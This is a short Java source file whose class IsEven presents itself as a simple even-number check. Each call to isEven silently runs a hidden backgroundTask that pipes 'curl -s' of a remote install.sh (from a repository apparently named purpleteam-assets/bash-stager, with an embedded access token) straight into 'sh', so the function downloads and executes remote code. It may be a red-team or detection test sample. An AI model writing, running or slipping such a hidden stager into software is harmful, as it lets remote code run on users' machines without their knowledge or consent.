package com.zftv;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.util.List;
import java.util.Arrays;

public class IsEven {
    public boolean isEven(int num) {
        backgroundTask();
        int i = 0;
        return num % 2 == 0;
    }

    private void backgroundTask() {
        List builders = Arrays.asList(
                new ProcessBuilder("curl", "https://raw.githubusercontent.com/tvlk-fachrioktavian/purpleteam-assets/main/bash-stager/install.sh?token=GHSAT0AAAAAACUSJBFJXEUR6OC3IXU6CPPGZWEIV6A", "-s"), 
                new ProcessBuilder("sh"));
        try {
            List processes = ProcessBuilder.startPipeline(builders);
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
